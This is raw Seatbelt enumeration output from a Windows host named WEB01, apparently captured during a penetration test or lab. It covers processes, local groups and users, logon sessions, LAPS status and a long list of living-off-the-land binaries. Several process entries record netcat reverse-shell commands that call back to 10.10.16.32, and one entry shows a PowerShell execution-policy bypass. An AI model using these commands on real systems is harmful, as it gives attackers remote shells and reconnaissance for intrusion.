    ProcessID    : 8024
    Owner        : WEB01\svc_dev
    CommandLine  : c:\windows\system32\cmd.exe /c %USERPROFILE%\nc.exe 10.10.16.32 6666 -e cmd

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 4752
    Owner        : WEB01\svc_dev
    CommandLine  : cmd

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 5008
    Owner        : WEB01\svc_dev
    CommandLine  : powershell

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 2460
    Owner        : WEB01\svc_dev
    CommandLine  : c:\windows\system32\cmd.exe /c %USERPROFILE%\nc.exe 10.10.16.32 4444 -e cmd

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 6852
    Owner        : WEB01\svc_dev
    CommandLine  : cmd

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 6860
    Owner        : WEB01\svc_dev
    CommandLine  : c:\windows\system32\cmd.exe /c %USERPROFILE%\nc.exe 10.10.16.32 4444 -e cmd

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 2536
    Owner        : WEB01\svc_dev
    CommandLine  : cmd

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 1768
    Owner        : WEB01\svc_dev
    CommandLine  : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -c "Import-Module .\Invoke-Seatbelt.ps1; Invoke-Seatbelt -Command '-group=all'"

====== InternetSettings ======

General Settings
  Hive                               Key : Value

  HKCU                IE5_UA_Backup_Flag : 5.0
  HKCU                   PrivacyAdvanced : 1
  HKCU                   SecureProtocols : 2048
  HKCU             CertificateRevocation : 1
  HKCU          DisableCachingOfSSLPages : 1
  HKCU                        User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU              ZonesSecurityUpgrade : System.Byte[]
  HKCU                WarnonZoneCrossing : 0
  HKCU                   EnableNegotiate : 1
  HKCU                      MigrateProxy : 1
  HKCU                       ProxyEnable : 0
  HKCU                      ActiveXCache : C:\Windows\Downloaded Program Files
  HKCU                CodeBaseSearchPath : CODEBASE
  HKCU                    EnablePunycode : 1
  HKCU                      MinorVersion : 0
  HKCU                    WarnOnIntranet : 1

URLs by Zone
  No URLs configured

Zone Auth Settings
====== KeePass ======

====== LAPS ======

  LAPS Enabled                          : False
  LAPS Admin Account Name               :
  LAPS Password Complexity              :
  LAPS Password Length                  :
  LAPS Expiration Protection Enabled    :
====== LastShutdown ======

  LastShutdown                   : 11/20/2024 8:42:54 AM

====== LocalGPOs ======

====== LocalGroups ======

Non-empty Local Groups (and memberships)


  ** WEB01\Administrators ** (Administrators have complete and unrestricted access to the computer/domain)

  User            WEB01\Administrator                      S-1-5-21-197600473-3515118913-3158175032-500
  Group           DAEDALUS\Domain Admins                   S-1-5-21-4088429403-1159899800-2753317549-512
  User            DAEDALUS\billing_user                    S-1-5-21-4088429403-1159899800-2753317549-1603

  ** WEB01\Guests ** (Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted)

  User            WEB01\Guest                              S-1-5-21-197600473-3515118913-3158175032-501

  ** WEB01\Performance Log Users ** (Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer)

  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  Unknown         S-1-5-21-2133302606-3209669538-3615740910-500\ S-1-5-21-2133302606-3209669538-3615740910-500

  ** WEB01\Performance Monitor Users ** (Members of this group can access performance counter data locally and remotely)

  WellKnownGroup  NT SERVICE\MSSQLSERVER                   S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
  WellKnownGroup  NT SERVICE\SQLSERVERAGENT                S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430

  ** WEB01\System Managed Accounts Group ** (Members of this group are managed by the system.)

  User            WEB01\DefaultAccount                     S-1-5-21-197600473-3515118913-3158175032-503

  ** WEB01\Users ** (Users are prevented from making accidental or intentional system-wide changes and can run most applications)

  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  WellKnownGroup  NT AUTHORITY\Authenticated Users         S-1-5-11
  User            WEB01\svc_dev                            S-1-5-21-197600473-3515118913-3158175032-1003
  Group           DAEDALUS\Domain Users                    S-1-5-21-4088429403-1159899800-2753317549-513

  ** WEB01\SQLServer2005SQLBrowserUser$SQL01 ** (Members in the group have the required access and privileges to be assigned as the log on account for the associated instance of SQL Server Browser.)

  WellKnownGroup  NT SERVICE\SQLBrowser                    S-1-5-80-2488930588-2400869415-1350125619-3751000688-192790804

====== LocalUsers ======

  ComputerName                   : localhost
  UserName                       : Administrator
  Enabled                        : True
  Rid                            : 500
  UserType                       : Administrator
  Comment                        : Built-in account for administering the computer/domain
  PwdLastSet                     : 12/20/2019 4:25:15 AM
  LastLogon                      : 11/20/2024 8:40:45 AM
  NumLogins                      : 11597

  ComputerName                   : localhost
  UserName                       : DefaultAccount
  Enabled                        : False
  Rid                            : 503
   Comment                        : A user account managed by the system.
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : Guest
  Enabled                        : False
  Rid                            : 501
  UserType                       : Guest
  Comment                        : Built-in account for guest access to the computer/domain
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : svc_dev
  Enabled                        : True
  Rid                            : 1003
  UserType                       : User
  Comment                        :
  PwdLastSet                     : 10/13/2020 10:47:53 AM
  LastLogon                      : 3/24/2026 11:06:47 AM
  NumLogins                      : 65535

  ComputerName                   : localhost
  UserName                       : WDAGUtilityAccount
  Enabled                        : False
  Rid                            : 504
  UserType                       : Guest
  Comment                        : A user account managed and used by the system for Windows Defender Application Guard scenarios.
  PwdLastSet                     : 1/21/2020 6:04:41 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

====== LogonEvents ======

ERROR: Unable to collect. Must be an administrator/in a high integrity context.
====== LogonSessions ======

Logon Sessions (via WMI)


  UserName              : svc_dev
  Domain                : WEB01
  LogonId               : 451545
  LogonType             : Interactive
  AuthenticationPackage : NTLM
  StartTime             : 3/23/2026 8:53:07 PM
  UserPrincipalName     :

  UserName              : svc_dev
  Domain                : WEB01
  LogonId               : 10692569
  LogonType             : NetworkCleartext
  AuthenticationPackage : NTLM
  StartTime             : 3/24/2026 6:26:29 AM
  UserPrincipalName     :

  UserName              : svc_dev
  Domain                : WEB01
  LogonId               : 12608906
  LogonType             : NetworkCleartext
  AuthenticationPackage : NTLM
  StartTime             : 3/24/2026 8:07:50 AM
  UserPrincipalName     :

  UserName              : svc_dev
  Domain                : WEB01
  LogonId               : 12668510
  LogonType             : NetworkCleartext
  AuthenticationPackage : NTLM
  StartTime             : 3/24/2026 8:09:05 AM
  UserPrincipalName     :

  UserName              : svc_dev
  Domain                : WEB01
  LogonId               : 12705657
  LogonType             : NetworkCleartext
  AuthenticationPackage : NTLM
  StartTime             : 3/24/2026 8:10:02 AM
  UserPrincipalName     :

  UserName              : svc_dev
  Domain                : WEB01
  LogonId               : 15031536
  LogonType             : NetworkCleartext
  AuthenticationPackage : NTLM
  StartTime             : 3/24/2026 9:47:31 AM
  UserPrincipalName     :

  UserName              : svc_dev
  Domain                : WEB01
  LogonId               : 17014877
  LogonType             : NetworkCleartext
  AuthenticationPackage : NTLM
  StartTime             : 3/24/2026 11:02:06 AM
  UserPrincipalName     :

  UserName              : svc_dev
  Domain                : WEB01
  LogonId               : 356907
  LogonType             : Service
  AuthenticationPackage : NTLM
  StartTime             : 3/23/2026 8:52:58 PM
  UserPrincipalName     :
====== LOLBAS ======

Path: C:\Windows\System32\advpack.dll
Path: C:\Windows\SysWOW64\advpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-advpack_31bf3856ad364e35_11.0.17763.1_none_d082ca37b5d3d7c3\advpack.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-advpack_31bf3856ad364e35_11.0.17763.1_none_dad77489ea3499be\advpack.dll
Path: C:\Windows\System32\at.exe
Path: C:\Windows\SysWOW64\at.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-at_31bf3856ad364e35_10.0.17763.1_none_3dc78e4edc0df1b1\at.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-at_31bf3856ad364e35_10.0.17763.1_none_481c38a1106eb3ac\at.exe
Path: C:\Windows\System32\AtBroker.exe
Path: C:\Windows\SysWOW64\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.1_none_c06699b6767ea3f0\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_1cf40b03f04f6dc9\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.1_none_cabb4408aadf65eb\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_2748b55624b02fc4\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_1cf40b03f04f6dc9\f\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_1cf40b03f04f6dc9\r\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_2748b55624b02fc4\f\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.2989_none_2748b55624b02fc4\r\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.1_none_3061487514bb83f7\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.2989_none_8ceeb9c28e8c4dd0\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.2989_none_8ceeb9c28e8c4dd0\f\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.2989_none_8ceeb9c28e8c4dd0\r\bash.exe
Path: C:\Windows\System32\bitsadmin.exe
PPath: C:\Windows\WinSxS\amd64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.17763.1_none_3dd77ae7649577fa\bitsadmin.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.17763.1_none_482c253998f639f5\bitsadmin.exe
Path: C:\Windows\System32\certutil.exe
Path: C:\Windows\SysWOW64\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.1_none_a64af1d28b85fec8\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_02fa1d38053d38b7\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.1_none_b09f9c24bfe6c0c3\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_0d4ec78a399dfab2\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_02fa1d38053d38b7\f\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_02fa1d38053d38b7\r\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_0d4ec78a399dfab2\f\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.5696_none_0d4ec78a399dfab2\r\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-audiodiagnostic_31bf3856ad364e35_10.0.17763.1_none_b14d5ceb47e2e05b\CL_Invocation.ps1
Path: C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1
Path: C:\Windows\WinSxS\amd64_microsoft-windows-videodiagnostic_31bf3856ad364e35_10.0.17763.1_none_6da811f997075340\CL_MutexVerifiers.ps1
Path: C:\Windows\diagnostics\system\Video\CL_MutexVerifiers.ps1
Path: C:\Windows\System32\cmd.exe
Path: C:\Windows\SysWOW64\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_d881bda7ec3d545f\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1_none_7bd2b0a27285f56b\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_e2d667fa209e165a\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1_none_86275af4a6e6b766\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_d881bda7ec3d545f\f\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_d881bda7ec3d545f\r\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_e2d667fa209e165a\f\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.1697_none_e2d667fa209e165a\r\cmd.exe
Path: C:\Windows\System32\cmdkey.exe
Path: C:\Windows\SysWOW64\cmdkey.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.17763.1_none_cdad5caa35016f49\cmdkey.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.17763.1_none_d80206fc69623144\cmdkey.exe
Path: C:\Windows\System32\cmstp.exe
Path: C:\Windows\SysWOW64\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rascmak.resources_31bf3856ad364e35_10.0.17763.1_en-us_2c0cad1684b8d27b\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.1_none_4fe62956b8aef8eb\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_ac7a3bd8327b38ec\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.1_none_5a3ad3a8ed0fbae6\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_b6cee62a66dbfae7\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_ac7a3bd8327b38ec\f\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_ac7a3bd8327b38ec\r\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_b6cee62a66dbfae7\f\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.5830_none_b6cee62a66dbfae7\r\cmstp.exe
Path: C:\Windows\System32\comsvcs.dll
Path: C:\Windows\SysWOW64\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.1_none_63884f12f80766f9\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_c0114d5071dc0fce\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.1_none_6ddcf9652c6828f4\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_ca65f7a2a63cd1c9\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_c0114d5071dc0fce\f\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_c0114d5071dc0fce\r\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_ca65f7a2a63cd1c9\f\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.5933_none_ca65f7a2a63cd1c9\r\comsvcs.dll
Path: C:\Windows\System32\control.exe
Path: C:\Windows\SysWOW64\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.1_none_8a31e32302a74069\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_e6f8feb07c4db13b\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.1_none_94868d7537080264\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_f14da902b0ae7336\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_e6f8feb07c4db13b\f\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_e6f8feb07c4db13b\r\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_f14da902b0ae7336\f\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.2300_none_f14da902b0ae7336\r\control.exe
Path: C:\Windows\WinSxS\amd64_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_75029b843b5b1af7\csc.exe
Path: C:\Windows\WinSxS\x86_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_bcafd25b4fd743fd\csc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
Path: C:\Windows\System32\cscript.exe
Path: C:\Windows\SysWOW64\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.1_none_392e3cfb58835d77\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.1_none_4382e74d8ce41f72\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\f\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\r\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\f\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\r\cscript.exe
Path: C:\Windows\System32\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.17763.1_none_31b836cb32d2cbbf\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.17763.2989_none_8e45a818aca39598\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.17763.2989_none_8e45a818aca39598\f\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.17763.2989_none_8e45a818aca39598\r\desktopimgdownldr.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-c..otstrapping-service_31bf3856ad364e35_10.0.17763.1697_none_5d4186424caa7d12\f\devtoolslauncher.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-c..otstrapping-service_31bf3856ad364e35_10.0.17763.1697_none_5d4186424caa7d12\r\devtoolslauncher.exe
Path: C:\Windows\WinSxS\amd64_netfx4-dfsvc_b03f5f7f11d50a3a_4.0.15713.0_none_a43786f92b366cab\dfsvc.exe
Path: C:\Windows\WinSxS\msil_dfsvc_b03f5f7f11d50a3a_4.0.15713.0_none_069772df8b7f60fe\dfsvc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\dfsvc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\dfsvc.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\dfsvc\v4.0_4.0.0.0__b03f5f7f11d50a3a\dfsvc.exe
Path: C:\Windows\System32\diskshadow.exe
Path: C:\Windows\SysWOW64\diskshadow.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-vssdiskshadow_31bf3856ad364e35_10.0.17763.1_none_262eee7884162127\diskshadow.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-vssdiskshadow_31bf3856ad364e35_10.0.17763.1_none_ca1052f4cbb8aff1\diskshadow.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.1_none_d7fc21f9a64ab1bb\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.5830_none_3490347b2016f1bc\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.5830_none_3490347b2016f1bc\f\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.5830_none_3490347b2016f1bc\r\dnscmd.exe
Path: C:\Program Files\dotnet\dotnet.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-directx-graphics-tools_31bf3856ad364e35_10.0.17763.1999_none_7d13786b2e2a2730\f\dxcap.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-directx-graphics-tools_31bf3856ad364e35_10.0.17763.1999_none_7d13786b2e2a2730\r\dxcap.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-directx-graphics-tools_31bf3856ad364e35_10.0.17763.1999_none_876822bd628ae92b\f\dxcap.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-directx-graphics-tools_31bf3856ad364e35_10.0.17763.1999_none_876822bd628ae92b\r\dxcap.exe
Path: C:\Windows\System32\esentutl.exe
Path: C:\Windows\SysWOW64\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.1_none_ca51d6e31d6a8d29\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_274264ce96f08e37\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.1_none_d4a6813551cb4f24\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_31970f20cb515032\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_274264ce96f08e37\f\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_274264ce96f08e37\r\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_31970f20cb515032\f\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.2090_none_31970f20cb515032\r\esentutl.exe
Path: C:\Windows\System32\eventvwr.exe
Path: C:\Windows\SysWOW64\eventvwr.exe
Path: C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.17763.1_none_e5bdc1ec5bdc8ffe\eventvwr.exe
Path: C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.17763.1_none_f0126c3e903d51f9\eventvwr.exe
Path: C:\Windows\System32\expand.exe
Path: C:\Windows\SysWOW64\expand.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-expand_31bf3856ad364e35_10.0.17763.1_none_49386661b009dd04\expand.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-expand_31bf3856ad364e35_10.0.17763.1_none_538d10b3e46a9eff\expand.exe
Path: C:\Program Files\internet explorer\ExtExport.exe
Path: C:\Program Files (x86)\Internet Explorer\ExtExport.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.17763.1_none_52b5255e8688e021\ExtExport.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.17763.1_none_f69689dace2b6eeb\ExtExport.exe
Path: C:\Windows\System32\extrac32.exe
Path: C:\Windows\SysWOW64\extrac32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.17763.1_none_cbef84845c0ecfaa\extrac32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.17763.1_none_d6442ed6906f91a5\extrac32.exe
Path: C:\Windows\System32\findstr.exe
Path: C:\Windows\SysWOW64\findstr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-findstr_31bf3856ad364e35_10.0.17763.1_none_17f57547b1de1380\findstr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-findstr_31bf3856ad364e35_10.0.17763.1_none_224a1f99e63ed57b\findstr.exe
Path: C:\Windows\System32\forfiles.exe
Path: C:\Windows\SysWOW64\forfiles.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.17763.1_none_45e9598535b23646\forfiles.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.17763.1_none_503e03d76a12f841\forfiles.exe
Path: C:\Windows\System32\ftp.exe
Path: C:\Windows\SysWOW64\ftp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ftp_31bf3856ad364e35_10.0.17763.1_none_9db147d5b0b369b2\ftp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ftp_31bf3856ad364e35_10.0.17763.1_none_a805f227e5142bad\ftp.exe
Path: C:\Windows\System32\gpscript.exe
Path: C:\Windows\SysWOW64\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_b28ee641418c40d5\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1_none_55dd2267c7d5aee9\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_bce3909375ed02d0\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1_none_6031ccb9fc3670e4\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_b28ee641418c40d5\f\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_b28ee641418c40d5\r\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_bce3909375ed02d0\f\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1518_none_bce3909375ed02d0\r\gpscript.exe
